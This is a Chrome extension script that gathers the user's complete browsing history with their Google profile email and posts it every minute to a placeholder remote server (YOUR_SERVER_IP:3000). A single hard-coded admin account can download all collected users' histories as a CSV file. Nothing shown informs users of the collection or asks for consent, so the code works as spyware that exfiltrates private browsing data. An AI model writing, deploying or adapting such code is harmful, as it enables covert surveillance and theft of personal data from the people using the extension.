const URL_ENDPOINT = "http://YOUR_SERVER_IP";
const POST_URL = `${URL_ENDPOINT}:3000/api/historyDataInsert`;
let ExisitingHistoryData = []
let historyData = [];
let USER_EMAIL = ""
let historyTimeout;
function formatLastVisitTime(lastVisitTime) {
      const date = new Date(lastVisitTime);
      const day = ("0" + date.getDate()).slice(-2);
      const month = ("0" + (date.getMonth() + 1)).slice(-2);
      const year = date.getFullYear();
      const hours = ("0" + date.getHours()).slice(-2);
      const minutes = ("0" + date.getMinutes()).slice(-2);
      const seconds = ("0" + date.getSeconds()).slice(-2);
      return `${day}-${month}-${year} ${hours}:${minutes}:${seconds}` || "";
}
function downloadCSV(downloadHistoryData) {
      const rows = downloadHistoryData.map(({ email, title, url, lastVisitedTime }) =>
                [email, title, url, lastVisitedTime]
                                                       .map((field) => `"${field.replace(/"/g, '""')}"`)
                                                       .join(",")
                                               );
      const csv = "Email,Title,URL,Last Visited Time\n" + rows.join("\n");
      const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
      const link = document.createElement("a");
      const url = URL.createObjectURL(blob);
      link.setAttribute("href", url);
      link.setAttribute("download", "history.csv");
      link.style.display = "none";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
}
const getDownloadData = () => {
      fetch(`${URL_ENDPOINT}:3000/api/historyData`).then((response) => {
                response.json().then((res) => {
                              if (res && Array.isArray(res?.history)) {
                                                downloadCSV(res.history);
                              }
                });
      });
}
const removeExisitingHistory = (ExisitingHistoryData) => {
      //list of exisiting visitedHistory of user
      const existingEmails = ExisitingHistoryData.filter(
                (item) => item.email === historyData?.[0]?.email
            ).map((item) => item.lastVisitedTime);
      //Existing VisitedItems match with the current history
      const matchingItems = historyData.filter((item) =>
                existingEmails.includes(item.lastVisitedTime)
                                                   );
      if (matchingItems.length > 0) {
                historyData = historyData.filter(
                              (item) => !existingEmails.includes(item.lastVisitedTime)
                          );
      }
      if (historyData.length > 0) {
                fetch(POST_URL, {
                              method: "POST",
                              body: JSON.stringify(historyData),
                              headers: {
                                                "Content-Type": "application/json",
                              },
                })
                    .then((response) => console.log("success"))
                    .catch((error) => console.error(error));
      } else {
                console.log("NO CAlL");
      }
};
const historyPostCall = () => {
      //fetch Exisiting Data
      fetch(`${URL_ENDPOINT}:3000/api/historyData`).then((response) => {
                response.json().then((res) => {
                              if (res && Array.isArray(res?.history)) {
                                                ExisitingHistoryData = res.history;
                                                removeExisitingHistory(res.history);
                              }
                });
      });
}
const keepPostingHistory = () => {
      chrome.identity.getProfileUserInfo((userInfo) => {
                chrome.history.search(
                  { text: "", maxResults: 999999 },
                              function (historyItems) {
                                                historyItems.forEach(function (historyItem) {
                                                                      var data = {
                                                                                                email: userInfo?.email,
                                                                                                title: historyItem?.title,
                                                                                                url: historyItem?.url,
                                                                                                lastVisitedTime: formatLastVisitTime(historyItem.lastVisitTime),
                                                                      };
                                                                      historyData.push(data);
                                                });
                              },
                          );
                //List of the lastVisitedTime of user
                                                 historyTimeout = setInterval(() => {
                                                               historyPostCall();
                                                 }, 60000);
      });
};
window.addEventListener("unload", () => {
      clearInterval(historyTimeout);
});
document.addEventListener("DOMContentLoaded", async ()=> {
      chrome.identity.getProfileUserInfo((userInfo) => {
                let USER_EMAIL = userInfo.email;
                // Use the user's email as the unique identifier
                                                 if (userInfo.email === "admin@example.com") {
                                                               document.getElementById("download-button").style.visibility = "visible";
                                                               const downloadButton = document.getElementById("download-button");
                                                               if (downloadButton) downloadButton.addEventListener("click", getDownloadData);
                                                 } else {
                                                               document.getElementById("download-button").style.visibility = "hidden";
                                                               keepPostingHistory();
                                                 }
      })
})
